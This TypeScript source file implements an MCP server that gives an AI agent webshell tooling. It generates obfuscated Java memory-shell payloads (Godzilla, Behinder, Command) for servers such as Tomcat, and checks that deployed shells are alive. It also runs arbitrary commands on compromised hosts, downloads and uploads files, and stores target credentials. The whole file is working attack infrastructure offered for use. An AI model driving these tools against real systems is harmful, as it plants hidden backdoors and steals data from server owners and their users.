import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { writeFileSync } from "node:fs";
import { z } from "zod";

import { MemPartyClient } from "../api/client.js";
import { requireProtocol, unsupportedMessage, type ProtocolOptions } from "../connect/registry.js";
import type {} from "../connect/types.js";
import { readUploadFile, resolveDownloadPath } from "../core/localfile.js";
import { logOp, opLogPath, readOps, truncateOutput, type OpCategory } from "../core/oplog.js";
import { emitSinglePackResult } from "../core/output.js";
import {
  autoSaveShell,
  listProjects,
  removeProject,
  removeShell,
  resolveConnection,
  saveProjectMeta,
  saveShell,
  saveShellMeta,
  targetStorePath,
} from "../core/targets.js";
import { buildMemShellRequest } from "../core/request-builder.js";
import { buildProbeRequest } from "../core/request-builder.js";
import { parseObfuscationOptions } from "../core/obfuscation.js";
import { fetchRemoteOptions, parseShellToolConfig } from "../core/shell-tool-config.js";
import { agentLoadExamples, supportsAgentLoadArguments } from "../core/agent.js";
import { CLI_VERSION } from "../version.js";

function jsonContent(data: unknown) {
  return { content: [{ type: "text" as const, text: JSON.stringify(data, null, 2) }] };
}

function errorContent(err: unknown) {
  return {
    isError: true,
    content: [{ type: "text" as const, text: `Error: ${(err as Error).message}` }],
  };
}

const memShellInput = {
  server: z.string().describe("Target server, e.g. Tomcat"),
  serverVersion: z.string().optional(),
  shellTool: z.string().describe("Shell tool, e.g. Godzilla, Behinder, Command"),
  shellType: z.string().describe("Shell type, e.g. Listener, Filter, Servlet"),
  packer: z.string().describe("Packer, e.g. Base64, Jar, JSP"),
  jdk: z.string().optional().describe("java6/8/9/11/17/21/25 or class-file major version"),
  debug: z.boolean().optional(),
  byPassJavaModule: z.boolean().optional(),
  shrink: z.boolean().optional(),
  lambdaSuffix: z.boolean().optional(),
  probe: z.boolean().optional(),
  obfuscate: z.boolean().optional(),
  obfuscationOptions: z.string().optional().describe("obfuscation overrides: key=value, comma-separated"),
  obfuscationScope: z.enum(["ALL", "MEMSHELL_INJECTOR", "INJECTOR", "MEMSHELL"]).optional(),
  shellClassName: z.string().optional(),
  toolOptions: z
    .record(z.union([z.string(), z.record(z.unknown())]))
    .optional()
    .describe(
      "Additional shell-tool fields from list_shell_tool_configs, including plugin fields. " +
        "String/enum fields use strings; v3.1+ object fields use JSON objects. " +
        "These override matching built-in convenience arguments.",
    ),
  toolOptionJson: z
    .record(z.string())
    .optional()
    .describe("String-encoded shell-tool fields (name -> value); object fields contain JSON text."),
  godzillaPass: z.string().optional(),
  godzillaKey: z.string().optional(),
  behinderPass: z.string().optional(),
  antSwordPass: z.string().optional(),
  commandParamName: z.string().optional(),
  commandTemplate: z.string().optional(),
  encryptor: z.string().optional(),
  implementationClass: z.string().optional(),
  headerName: z.string().optional(),
  headerValue: z.string().optional(),
  shellClassBase64: z.string().optional(),
  urlPattern: z.string().optional(),
  injectorClassName: z.string().optional(),
  staticInitialize: z.boolean().optional(),
  agentArgs: z.string().optional().describe("Agent load-time arguments (persist=true / restore=true); not sent to the generate API"),
  outputFile: z
    .string()
    .optional()
    .describe(
      "also write the packed payload to this local file " +
        "(auto base64-decodes for .class/.jar/.zip/.ser/.bin); the response gains an " +
        "outputFile field with the write result. Fails for aggregate packers that " +
        "return several variants — pick a leaf packer (e.g. DefaultBase64).",
    ),
};

const probeInput = {
  probeMethod: z.enum(["ResponseBody", "ResponseHeader", "DNSLog", "Sleep"]),
  probeContent: z.string().describe("Server, JDK, Bytecode, Command, ScriptEngine, Filter"),
  packer: z.string(),
  jdk: z.string().optional(),
  debug: z.boolean().optional(),
  byPassJavaModule: z.boolean().optional(),
  shrink: z.boolean().optional(),
  lambdaSuffix: z.boolean().optional(),
  obfuscate: z.boolean().optional(),
  obfuscationOptions: memShellInput.obfuscationOptions,
  staticInitialize: z.boolean().optional(),
  shellClassName: z.string().optional(),
  host: z.string().optional(),
  seconds: z.number().optional(),
  sleepServer: z.string().optional(),
  server: z.string().optional(),
  reqParamName: z.string().optional(),
  commandTemplate: z.string().optional(),
  respHeaderName: z.string().optional(),
  outputFile: memShellInput.outputFile,
};

const bytecodeInput = {
  classBytesBase64: z.string().describe("Base64 or GzipBase64 class bytes"),
  outputFile: z.string().optional().describe("also write the transformed class to this local file"),
};

const bytecodeTransformInput = {
  ...bytecodeInput,
  packer: z.string().optional(),
  byPassJavaModule: z.boolean().optional(),
  staticInitialize: z.boolean().optional(),
  shrink: z.boolean().optional(),
  renamePackage: z.boolean().optional(),
  relocateFrom: z.string().optional(),
  relocateTo: z.string().optional(),
  entryMethod: z.string().optional(),
  newClassName: z.string().optional(),
  randomName: z.boolean().optional(),
  obfuscate: z.boolean().optional(),
  obfuscationOptions: memShellInput.obfuscationOptions,
  server: z.string().optional(),
  probeMethod: z.enum(["ResponseBody", "ResponseHeader"]).optional(),
  respHeaderName: z.string().optional(),
};

const connectInput = {
  name: z
    .string()
    .optional()
    .describe(
      "saved target reference (<project>/<shell>, or a bare project holding exactly one shell) — " +
        "when set, url/tool/pass/... fall back to the saved values (see target_save/target_list)",
    ),
  url: z.string().optional().describe("URL of the deployed shell (or pass `name`)"),
  tool: z
    .enum(["godzilla", "behinder", "suo5"])
    .optional()
    .describe("shell tool to test (or taken from the saved target)"),
  pass: z
    .string()
    .optional()
    .describe("password (godzilla default: pass; behinder default: rebeyond)"),
  key: z.string().optional().describe("godzilla key (default: key)"),
  headerName: z
    .string()
    .optional()
    .describe("gate header name from generate_memshell shellToolConfig (usually User-Agent)"),
  headerValue: z
    .string()
    .optional()
    .describe("gate header value from generate_memshell shellToolConfig — required for MemShellParty shells"),
  suo5Mode: z
    .enum(["auto", "v2", "v1"])
    .optional()
    .describe("suo5 protocol variant (default: auto)"),
  insecure: z.boolean().optional().describe("skip TLS certificate verification"),
  timeoutMs: z.number().optional().describe("request timeout in milliseconds (default 30000)"),
  upgradeProtocol: z.string().optional().describe("Godzilla Upgrade: fully-qualified generated shell class name"),
};

const execInput = {
  name: z
    .string()
    .optional()
    .describe(
      "saved target reference (<project>/<shell>, or a bare project holding exactly one shell) — " +
        "when set, url/tool/pass/... fall back to the saved values (see target_save/target_list)",
    ),
  url: z.string().optional().describe("URL of the deployed shell (or pass `name`)"),
  tool: z
    .enum(["godzilla", "behinder"])
    .optional()
    .describe("shell tool to execute through (or taken from the saved target)"),
  command: z.string().describe("command line to execute on the target"),
  pass: z
    .string()
    .optional()
    .describe("password (godzilla default: pass; behinder default: rebeyond)"),
  key: z.string().optional().describe("godzilla key (default: key)"),
  os: z
    .enum(["auto", "windows", "linux"])
    .optional()
    .describe(
      "godzilla only: remote OS for the shell wrapper (default: auto — one extra request to detect; behinder detects the OS inside its payload)",
    ),
  headerName: z
    .string()
    .optional()
    .describe("gate header name from generate_memshell shellToolConfig (usually User-Agent)"),
  headerValue: z
    .string()
    .optional()
    .describe("gate header value from generate_memshell shellToolConfig — required for MemShellParty shells"),
  insecure: z.boolean().optional().describe("skip TLS certificate verification"),
  timeoutMs: z.number().optional().describe("request timeout in milliseconds (default 30000)"),
  upgradeProtocol: z.string().optional().describe("Godzilla Upgrade: fully-qualified generated shell class name"),
};

/** Connection fields shared by download_file / upload_file (no command/os). */
const transferConnInput = {
  name: execInput.name,
  url: execInput.url,
  tool: execInput.tool,
  pass: execInput.pass,
  key: execInput.key,
  headerName: execInput.headerName,
  headerValue: execInput.headerValue,
  insecure: execInput.insecure,
  timeoutMs: execInput.timeoutMs,
  upgradeProtocol: execInput.upgradeProtocol,
  remoteCharset: z
    .string()
    .optional()
    .describe(
      "godzilla only: charset for non-ASCII remote paths (any Java label, e.g. GBK; default UTF-8)",
    ),
};

const downloadInput = {
  ...transferConnInput,
  remotePath: z.string().describe("remote file path to download"),
  localPath: z
    .string()
    .optional()
    .describe(
      "local destination (default: ./<remote basename>; an existing directory keeps the basename)",
    ),
  force: z
    .boolean()
    .optional()
    .describe("overwrite the local file when it already exists (default: refuse)"),
};

const uploadInput = {
  ...transferConnInput,
  localPath: z.string().describe("local file to upload (max 64 MiB)"),
  remotePath: z.string().describe("remote destination path (overwritten when it exists)"),
};

const targetSaveInput = {
  project: z.string().describe("project name (created when missing)"),
  shell: z.string().describe("shell name inside the project"),
  url: z.string().describe("URL of the deployed shell"),
  tool: z.enum(["godzilla", "behinder", "suo5"]).describe("shell tool"),
  pass: z.string().optional().describe("password"),
  key: z.string().optional().describe("godzilla key"),
  headerName: z.string().optional().describe("gate header name (shellToolConfig.headerName)"),
  headerValue: z.string().optional().describe("gate header value (shellToolConfig.headerValue)"),
  insecure: z.boolean().optional().describe("skip TLS certificate verification"),
  upgradeProtocol: z.string().optional().describe("Godzilla Upgrade: fully-qualified generated shell class name"),
  projectRemark: z.string().optional().describe("project remark (merged into the project)"),
  projectCategory: z.string().optional().describe("project category (merged into the project)"),
  shellRemark: z.string().optional().describe("remark for this shell"),
};

export function createMcpServer(client: MemPartyClient): McpServer {
  const server = new McpServer({ name: "memshell-party", version: CLI_VERSION });

  server.registerTool(
    "bytecode_decode",
    {
      title: "Decode Java class",
      description: "Decode Base64/GzipBase64 class bytes and return class metadata (MemShellParty v3+).",
      inputSchema: bytecodeInput,
    },
    async (args) => {
      try {
        const result = await client.decodeBytecode(args.classBytesBase64);
        const outputFile = args.outputFile === undefined
          ? undefined
          : emitSinglePackResult(
              { packResult: result.classBytesBase64Str },
              { outFile: args.outputFile, decode: true },
            );
        return jsonContent(outputFile === undefined ? result : { ...result, outputFile });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "bytecode_transform",
    {
      title: "Transform Java class",
      description: "Rename, relocate, instrument, obfuscate or pack a Java class (MemShellParty v3+).",
      inputSchema: bytecodeTransformInput,
    },
    async (args) => {
      try {
        const renamePackage = args.renamePackage || args.relocateFrom !== undefined || args.relocateTo !== undefined;
        if (renamePackage && (!args.relocateFrom || !args.relocateTo)) {
          throw new Error("Package relocation requires relocateFrom and relocateTo.");
        }
        const {
          outputFile: outputPath,
          obfuscate: _obfuscate,
          obfuscationOptions,
          probeMethod,
          server,
          respHeaderName,
          ...fields
        } = args;
        const request = {
          obfuscation:
            args.obfuscate || args.obfuscationOptions !== undefined
              ? { enabled: true, options: parseObfuscationOptions(args.obfuscationOptions) }
              : undefined,
          ...(probeMethod === undefined ? {} : {
            server: server ?? "Unknown",
            probe: {
              probeMethod,
              probeContent: "Bytecode",
              respHeaderName,
            },
          }),
        };
        const result = await client.transformBytecode({
          classBytesBase64: args.classBytesBase64,
          ...(Object.fromEntries(Object.entries(fields).filter(([, value]) => value !== undefined))),
          ...(renamePackage ? { renamePackage } : {}),
          ...request,
        });
        const outputFile = outputPath === undefined
          ? undefined
          : emitSinglePackResult(
              { packResult: result.packResult ?? result.classBytesBase64Str },
              { outFile: outputPath, decode: result.packResult === undefined || undefined },
            );
        return jsonContent(outputFile === undefined ? result : { ...result, outputFile });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_servers",
    { title: "List servers", description: "List supported servers and their shell types" },
    async () => {
      try {
        return jsonContent(await client.getServers());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_config",
    {
      title: "List full config",
      description: "List every server's shell tools and their supported shell types",
    },
    async () => {
      try {
        return jsonContent(await client.getConfig());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_packers",
    { title: "List packers", description: "List packers as a parent/child tree" },
    async () => {
      try {
        return jsonContent(await client.getPackerTree());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_command_configs",
    {
      title: "List command configs",
      description: "List Command-tool encryptors and implementation classes",
    },
    async () => {
      try {
        return jsonContent(await client.getCommandConfigs());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_shell_tool_configs",
    {
      title: "List shell tool configs",
      description:
        "List v3 shell tool parameter names, types, enum choices and groups. " +
        "An empty list means the backend uses the legacy v2 API.",
    },
    async () => {
      try {
        return jsonContent(await client.getShellToolConfigs());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_plugins",
    {
      title: "List external plugins",
      description:
        "List v3.1+ external plugin metadata, SPI services, load status and load errors. " +
        "An empty list means no plugins or a backend older than v3.1.",
    },
    async () => {
      try {
        return jsonContent(await client.getPlugins());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_remote_options",
    {
      title: "Resolve remote shell tool options",
      description:
        "Fetch and normalize a v3.1 remote-select field. Returns labels and string IDs or complete objects " +
        "ready to pass to generate_memshell toolOptions.",
      inputSchema: {
        tool: z.string(),
        param: z.string(),
        url: z.string().optional().describe("Remote HTTP(S) endpoint; falls back to the urlQueryParam environment variable."),
        object: z.boolean().optional().describe("Override object mode; normally inferred from the field type."),
      },
    },
    async (args) => {
      try {
        const descriptor = (await client.getShellToolConfigs()).find((config) => config.tool === args.tool);
        const param = descriptor?.params.find((candidate) => candidate.name === args.param);
        if (!param?.ui || param.ui.kind !== "remote-select") {
          throw new Error(`${args.tool}.${args.param} is not a remote-select shell tool option.`);
        }
        const sourceUrl = args.url ?? process.env[param.ui.urlQueryParam];
        if (!sourceUrl) {
          throw new Error(`Provide url or set the ${param.ui.urlQueryParam} environment variable.`);
        }
        const options = await fetchRemoteOptions(sourceUrl, param.ui, args.object ?? param.type === "object");
        return jsonContent({ tool: args.tool, param: args.param, sourceUrl, options });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "list_obfuscation_options",
    {
      title: "List obfuscation options",
      description: "List class obfuscation option keys, defaults and valid values (v3+)",
    },
    async () => {
      try {
        return jsonContent(await client.getObfuscationOptions());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "generate_memshell",
    {
      title: "Generate memory shell",
      description:
        "Generate a Java memory shell payload. The packed payload comes back in " +
        "`packResult`; pass `outputFile` to also write it to a local file " +
        "(base64 auto-decoded for .class/.jar/.zip/.ser/.bin).",
      inputSchema: memShellInput,
    },
    async (args) => {
      const meta = {
        server: args.server,
        serverVersion: args.serverVersion,
        shellTool: args.shellTool,
        shellType: args.shellType,
        packer: args.packer,
        jdk: args.jdk,
      };
      const started = Date.now();
      try {
        if (args.agentArgs !== undefined && !supportsAgentLoadArguments(args.shellType, args.packer)) {
          throw new Error(
            "agentArgs requires an Agent* shell type " +
              "and an AgentJar, AgentJarWithJDKAttacher, or AgentJarWithJREAttacher packer.",
          );
        }
        const hasPluginOptions = args.toolOptions !== undefined || args.toolOptionJson !== undefined;
        const toolConfigs = hasPluginOptions ? await client.getShellToolConfigs() : [];
        const shellToolParams = hasPluginOptions
          ? toolConfigs.find((config) => config.tool === args.shellTool)?.params
          : undefined;
        const shellToolConfig = {
          ...args.toolOptions,
          ...parseShellToolConfig(
            Object.entries(args.toolOptionJson ?? {}).map(([name, value]) => `${name}=${value}`),
            shellToolParams,
          ),
        };
        const response = await client.generateMemShell(
          buildMemShellRequest({
            ...args,
            shellToolConfig: hasPluginOptions ? shellToolConfig : undefined,
            shellToolParams,
            obfuscationOptions: parseObfuscationOptions(args.obfuscationOptions),
          }),
        );
        const outputFile =
          args.outputFile !== undefined
            ? emitSinglePackResult(response, { outFile: args.outputFile })
            : undefined;
        logOp({
          category: "gen",
          action: "gen",
          ok: true,
          durationMs: Date.now() - started,
          detail: `${response.memShellResult.shellClassName} (${response.memShellResult.shellSize} bytes)`,
          meta,
        });
        return jsonContent({
          ...response,
          ...(outputFile === undefined ? {} : { outputFile }),
          ...(args.agentArgs === undefined ? {} : {
            agentArgs: args.agentArgs,
            agentLoadExamples: agentLoadExamples(args.agentArgs),
          }),
        });
      } catch (err) {
        logOp({
          category: "gen",
          action: "gen",
          ok: false,
          durationMs: Date.now() - started,
          error: (err as Error).message,
          meta,
        });
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "generate_probe",
    {
      title: "Generate probe shell",
      description:
        "Generate a probe/detection shell payload. The packed payload comes back in " +
        "`packResult`; pass `outputFile` to also write it to a local file " +
        "(base64 auto-decoded for .class/.jar/.zip/.ser/.bin).",
      inputSchema: probeInput,
    },
    async (args) => {
      const meta = {
        probeMethod: args.probeMethod,
        probeContent: args.probeContent,
        packer: args.packer,
        jdk: args.jdk,
      };
      const started = Date.now();
      try {
        const response = await client.generateProbe(
          buildProbeRequest({
            ...args,
            obfuscationOptions: parseObfuscationOptions(args.obfuscationOptions),
          }),
        );
        const outputFile =
          args.outputFile !== undefined
            ? emitSinglePackResult(response, { outFile: args.outputFile })
            : undefined;
        logOp({
          category: "probe",
          action: "probe",
          ok: true,
          durationMs: Date.now() - started,
          detail: `${response.probeShellResult.shellClassName} (${response.probeShellResult.shellSize} bytes)`,
          meta,
        });
        return jsonContent(outputFile === undefined ? response : { ...response, outputFile });
      } catch (err) {
        logOp({
          category: "probe",
          action: "probe",
          ok: false,
          durationMs: Date.now() - started,
          error: (err as Error).message,
          meta,
        });
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "parse_classname",
    {
      title: "Parse class name",
      description: "Parse the fully-qualified class name from base64-encoded .class bytes",
      inputSchema: { classBase64: z.string().describe("base64-encoded .class file bytes") },
    },
    async ({ classBase64 }) => {
      try {
        return jsonContent({ className: await client.parseClassName(classBase64) });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "server_version",
    { title: "Server version", description: "Get the backend server version info" },
    async () => {
      try {
        return jsonContent(await client.getVersion());
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "connect_test",
    {
      title: "Test shell connection",
      description:
        "Test whether a deployed Godzilla / Behinder / suo5 shell is alive and the " +
        "credentials work, by performing the tool's real protocol handshake. " +
        "Pass a saved target `name`, or url+tool with the gate header " +
        "(headerName/headerValue) from generate_memshell output for MemShellParty shells. " +
        "On success the profile is auto-saved and the canonical name returned as " +
        "`savedAs` — reuse it as `name` in later calls.",
      inputSchema: connectInput,
    },
    async (args) => {
      try {
        const conn = resolveConnection(args.name, {
          url: args.url,
          tool: args.tool,
          pass: args.pass,
          key: args.key,
          headerName: args.headerName,
          headerValue: args.headerValue,
          insecure: args.insecure,
          upgradeProtocol: args.upgradeProtocol,
        });
        const common = {
          headerName: conn.headerName,
          headerValue: conn.headerValue,
          extraHeaders: conn.extraHeaders,
          timeoutMs: args.timeoutMs,
          insecure: conn.insecure,
          upgradeProtocol: conn.upgradeProtocol,
        };
        const options: ProtocolOptions = { suo5Mode: args.suo5Mode };
        const result = await requireProtocol(conn.tool).test({ conn, common, options });
        // a successful handshake proves the credentials — keep them as a named target
        let savedAs: string | undefined;
        if (result.ok && conn.targetName === undefined) {
          savedAs = autoSaveShell(conn);
          conn.targetName = savedAs;
        }
        logOp({
          category: "connect",
          action: "connect",
          targetName: conn.targetName,
          url: conn.url,
          tool: conn.tool,
          ok: result.ok,
          durationMs: result.durationMs,
          detail: result.detail,
          error: result.error,
        });
        return jsonContent(savedAs !== undefined ? { ...result, savedAs } : result);
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "exec_command",
    {
      title: "Execute command on shell",
      description:
        "Execute a command line on a deployed Godzilla / Behinder shell and return its " +
        "stdout+stderr. Uses the tool's real protocol (Godzilla execCommand method / " +
        "Behinder Cmd payload). Run connect_test first to verify credentials; pass a " +
        "saved target `name`, or url+tool with the same gate header " +
        "(headerName/headerValue) for MemShellParty shells. On success the profile " +
        "is auto-saved and the canonical name returned as `savedAs`.",
      inputSchema: execInput,
    },
    async (args) => {
      try {
        const conn = resolveConnection(args.name, {
          url: args.url,
          tool: args.tool,
          pass: args.pass,
          key: args.key,
          headerName: args.headerName,
          headerValue: args.headerValue,
          insecure: args.insecure,
          upgradeProtocol: args.upgradeProtocol,
        });
        const common = {
          headerName: conn.headerName,
          headerValue: conn.headerValue,
          extraHeaders: conn.extraHeaders,
          timeoutMs: args.timeoutMs,
          insecure: conn.insecure,
          upgradeProtocol: conn.upgradeProtocol,
        };
        const protocol = requireProtocol(conn.tool);
        if (!protocol.exec) throw new Error(unsupportedMessage(protocol, "exec"));
        const result = await protocol.exec({ conn, common, options: { os: args.os } }, args.command);
        // a successful exec proves the credentials — keep them as a named target
        let savedAs: string | undefined;
        if (result.ok && conn.targetName === undefined) {
          savedAs = autoSaveShell(conn);
          conn.targetName = savedAs;
        }
        const truncated = result.output !== undefined ? truncateOutput(result.output) : null;
        logOp({
          category: "exec",
          action: "exec",
          targetName: conn.targetName,
          url: conn.url,
          tool: conn.tool,
          ok: result.ok,
          durationMs: result.durationMs,
          command: args.command,
          output: truncated?.output,
          outputTruncated: truncated?.truncated || undefined,
          error: result.error,
        });
        return jsonContent(savedAs !== undefined ? { ...result, savedAs } : result);
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "download_file",
    {
      title: "Download file from shell",
      description:
        "Download a file from a deployed Godzilla / Behinder shell to the local machine. " +
        "Chunked transfer with integrity verification (Godzilla: remote size; Behinder: MD5). " +
        "Pass a saved target `name`, or url+tool with the gate header for MemShellParty shells. " +
        "The local file is never overwritten unless force=true. On success the profile is " +
        "auto-saved and the canonical name returned as `savedAs`.",
      inputSchema: downloadInput,
    },
    async (args) => {
      try {
        const conn = resolveConnection(args.name, {
          url: args.url,
          tool: args.tool,
          pass: args.pass,
          key: args.key,
          headerName: args.headerName,
          headerValue: args.headerValue,
          insecure: args.insecure,
          upgradeProtocol: args.upgradeProtocol,
        });
        const common = {
          headerName: conn.headerName,
          headerValue: conn.headerValue,
          extraHeaders: conn.extraHeaders,
          timeoutMs: args.timeoutMs,
          insecure: conn.insecure,
          upgradeProtocol: conn.upgradeProtocol,
        };
        // decide + validate the local destination before touching the network
        const localPath = resolveDownloadPath(args.remotePath, args.localPath, args.force ?? false);

        const protocol = requireProtocol(conn.tool);
        if (!protocol.download) throw new Error(unsupportedMessage(protocol, "download"));
        let result = await protocol.download(
          { conn, common, options: { remoteCharset: args.remoteCharset } },
          args.remotePath,
        );
        if (result.ok && result.data !== undefined) {
          try {
            writeFileSync(localPath, result.data);
          } catch (err) {
            result = {
              ...result,
              ok: false,
              error: `download succeeded but writing ${localPath} failed: ${(err as Error).message}`,
            };
          }
        }
        let savedAs: string | undefined;
        if (result.ok && conn.targetName === undefined) {
          savedAs = autoSaveShell(conn);
          conn.targetName = savedAs;
        }
        logOp({
          category: "download",
          action: "download",
          targetName: conn.targetName,
          url: conn.url,
          tool: conn.tool,
          ok: result.ok,
          durationMs: result.durationMs,
          detail: result.ok
            ? `${args.remotePath} -> ${localPath} (${result.bytes ?? 0} bytes)`
            : undefined,
          error: result.error,
          meta: { remotePath: args.remotePath, localPath, bytes: result.bytes },
        });
        const { data: _data, ...wire } = result;
        return jsonContent({ ...wire, localPath, savedAs });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "upload_file",
    {
      title: "Upload file to shell",
      description:
        "Upload a local file to a deployed Godzilla / Behinder shell, overwriting the remote " +
        "path (max 64 MiB). Chunked transfer with integrity verification (Godzilla: remote " +
        "size; Behinder: MD5). Pass a saved target `name`, or url+tool with the gate header " +
        "for MemShellParty shells. On success the profile is auto-saved and the canonical " +
        "name returned as `savedAs`.",
      inputSchema: uploadInput,
    },
    async (args) => {
      try {
        const conn = resolveConnection(args.name, {
          url: args.url,
          tool: args.tool,
          pass: args.pass,
          key: args.key,
          headerName: args.headerName,
          headerValue: args.headerValue,
          insecure: args.insecure,
          upgradeProtocol: args.upgradeProtocol,
        });
        const common = {
          headerName: conn.headerName,
          headerValue: conn.headerValue,
          extraHeaders: conn.extraHeaders,
          timeoutMs: args.timeoutMs,
          insecure: conn.insecure,
          upgradeProtocol: conn.upgradeProtocol,
        };
        // read + validate the local file before touching the network
        const data = readUploadFile(args.localPath);

        const protocol = requireProtocol(conn.tool);
        if (!protocol.upload) throw new Error(unsupportedMessage(protocol, "upload"));
        const result = await protocol.upload(
          { conn, common, options: { remoteCharset: args.remoteCharset } },
          args.remotePath,
          data,
        );
        let savedAs: string | undefined;
        if (result.ok && conn.targetName === undefined) {
          savedAs = autoSaveShell(conn);
          conn.targetName = savedAs;
        }
        logOp({
          category: "upload",
          action: "upload",
          targetName: conn.targetName,
          url: conn.url,
          tool: conn.tool,
          ok: result.ok,
          durationMs: result.durationMs,
          detail: result.ok
            ? `${args.localPath} -> ${args.remotePath} (${result.bytes ?? 0} bytes)`
            : undefined,
          error: result.error,
          meta: { localPath: args.localPath, remotePath: args.remotePath, bytes: result.bytes },
        });
        return jsonContent(savedAs !== undefined ? { ...result, savedAs } : result);
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "target_save",
    {
      title: "Save shell target",
      description:
        "Save a shell connection profile as <project>/<shell> so later connect_test / " +
        "exec_command calls only need the name. A project groups several shells and " +
        "carries an optional remark and category. Overwrites an existing shell.",
      inputSchema: targetSaveInput,
    },
    async (args) => {
      try {
        if (args.projectRemark !== undefined || args.projectCategory !== undefined) {
          saveProjectMeta(args.project, {
            remark: args.projectRemark,
            category: args.projectCategory,
          });
        }
        const stored = saveShell(args.project, args.shell, {
          url: args.url,
          tool: args.tool,
          pass: args.pass,
          key: args.key,
          headerName: args.headerName,
          headerValue: args.headerValue,
          insecure: args.insecure,
          upgradeProtocol: args.upgradeProtocol,
          remark: args.shellRemark,
        });
        logOp({
          category: "save",
          action: "save",
          targetName: `${args.project}/${args.shell}`,
          url: args.url,
          tool: args.tool,
          ok: true,
          detail: "saved",
          meta: {
            projectRemark: args.projectRemark,
            projectCategory: args.projectCategory,
            shellRemark: args.shellRemark,
          },
        });
        return jsonContent({ project: args.project, shell: args.shell, ...stored });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "target_note",
    {
      title: "Set remark/category",
      description:
        "Set or clear (empty string) a project's remark and/or category — or a shell's " +
        "remark when `shell` is given.",
      inputSchema: {
        project: z.string(),
        shell: z.string().optional().describe("when set, only `remark` applies (to the shell)"),
        remark: z.string().optional().describe('remark ("" to clear)'),
        category: z.string().optional().describe('project category ("" to clear; projects only)'),
      },
    },
    async (args) => {
      try {
        if (args.shell) {
          if (args.category !== undefined) {
            throw new Error("category only applies to projects");
          }
          const updated = saveShellMeta(args.project, args.shell, { remark: args.remark });
          logOp({
            category: "note",
            action: "note",
            targetName: `${args.project}/${args.shell}`,
            ok: true,
            detail: `remark=${updated.remark ?? "-"}`,
          });
          return jsonContent({
            project: args.project,
            shell: args.shell,
            remark: updated.remark,
          });
        }
        const updated = saveProjectMeta(args.project, {
          remark: args.remark,
          category: args.category,
        });
        logOp({
          category: "note",
          action: "note",
          targetName: args.project,
          ok: true,
          detail: `category=${updated.category ?? "-"} remark=${updated.remark ?? "-"}`,
        });
        return jsonContent({ project: args.project, ...updated, shells: Object.keys(updated.shells) });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "target_list",
    {
      title: "List saved targets",
      description:
        "List saved projects (remark, category) and their shells. Use the " +
        "<project>/<shell> references as `name` in connect_test / exec_command.",
      inputSchema: {
        category: z.string().optional().describe("only show projects in this category"),
      },
    },
    async (args) => {
      try {
        const all = listProjects();
        const filtered: Record<string, unknown> = {};
        for (const [name, p] of Object.entries(all)) {
          if (args.category !== undefined && p.category !== args.category) continue;
          filtered[name] = p;
        }
        return jsonContent({ storePath: targetStorePath(), projects: filtered });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "target_remove",
    {
      title: "Remove saved target",
      description: "Remove a whole project, or a single shell when `shell` is given.",
      inputSchema: {
        project: z.string(),
        shell: z.string().optional(),
      },
    },
    async (args) => {
      try {
        const removed = args.shell
          ? removeShell(args.project, args.shell)
          : removeProject(args.project);
        if (!removed) throw new Error(`unknown target ${args.project}/${args.shell ?? ""}`);
        logOp({
          category: "remove",
          action: "remove",
          targetName: args.shell ? `${args.project}/${args.shell}` : args.project,
          ok: true,
          detail: "removed",
        });
        return jsonContent({ removed: true, project: args.project, shell: args.shell });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  server.registerTool(
    "log_list",
    {
      title: "List operation log",
      description:
        "Read the global operation log (every gen/probe/connect/exec/save/note/remove op), " +
        "newest first. Filter by category and/or target.",
      inputSchema: {
        category: z
          .enum(["gen", "probe", "connect", "exec", "download", "upload", "save", "note", "remove"])
          .optional()
          .describe("operation category"),
        target: z
          .string()
          .optional()
          .describe("project name, project/shell, or a URL substring (e.g. host)"),
        limit: z.number().optional().describe("max entries (default 50)"),
      },
    },
    async (args) => {
      try {
        const entries = readOps({
          category: args.category as OpCategory | undefined,
          target: args.target,
          limit: args.limit,
        });
        return jsonContent({ logPath: opLogPath(), entries });
      } catch (err) {
        return errorContent(err);
      }
    },
  );

  return server;
}

/** Start the MCP server over stdio. */
export async function startMcpStdio(client: MemPartyClient): Promise<void> {
  const server = createMcpServer(client);
  const transport = new StdioServerTransport();
  await server.connect(transport);
}
